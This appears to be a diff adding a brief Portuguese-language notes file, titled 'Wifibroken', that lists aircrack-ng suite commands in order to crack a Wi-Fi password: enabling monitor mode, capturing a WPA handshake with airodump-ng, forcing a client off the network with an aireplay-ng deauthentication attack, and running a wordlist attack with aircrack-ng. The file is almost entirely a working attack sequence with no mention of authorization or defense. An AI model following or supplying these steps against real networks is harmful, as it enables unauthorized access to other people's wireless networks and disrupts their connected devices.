@@ -1,0 +1,10 @@
+Wifibroken
+Comandos:
+iwconfig (para ver se o sistema detecta seu adaptador wireless)
+ifconfig "sua interface de rede" up (sem aspas)
+iwlist "sua interface de rede" scanning (sem aspas, para capturar as redes ao alcance)
+airmon-ng start "sua interface de rede" (sem aspas, para colocar a placa de rede em modo monitor)
+ifconfig (para conferir se a inteface mon0, mon1... foi criada)
+airodump-ng mon0 --bssid "bssid da rede" --channel "canal da rede" --write "nomedoarquivo" (sem aspas, para capturar o handshake)
+aireplay-ng -0 100 -a "mac da rede" -c "mac do cliente" mon0 (sem aspas, para derrubar o cliente e depois ele autentificar novamente)
+aircrack-ng "nomedoarquivo-01.cap" -w "nomedaword.list" (sem aspas, para quebrar a senha)
